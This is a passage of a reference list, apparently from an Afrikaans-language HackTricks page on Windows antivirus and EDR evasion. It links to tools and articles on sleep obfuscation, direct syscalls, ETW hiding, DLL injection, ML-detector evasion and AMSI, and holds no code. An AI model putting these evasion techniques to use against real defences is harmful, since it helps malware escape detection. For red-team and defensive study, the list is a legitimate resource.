- [31] [Ekko-slaapobfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Verberging van jou Dotnet ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Misbruik van Chrome Remote Desktop in Red Team-operasies: ’n praktiese gids](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Om Defender se remediation-driver as ’n kernel-operasieprimitief te bewapen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo-metgeselkode](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Skep selfmaskerende funksies met LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-bronkode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-funksie](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Skep ’n child process met herlei invoer en afvoer](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: Herbou C#-nutsgoed met WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – Kompileer C# / .NET-projekte](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty-bewys-van-konsep en bronkode](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Misbruik van thread pool-internals vir shellcodeless DLL-injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024-benchmarkdatastel en thrember-nutsgoed](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Gebruik van EMBER2024 om red team-implants te evalueer](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Ontduiking van masjienleer-gebaseerde opsporing](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader: XAML-gebaseerde .NET-laairaamwerk](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT-enumerasie](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan-metode](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
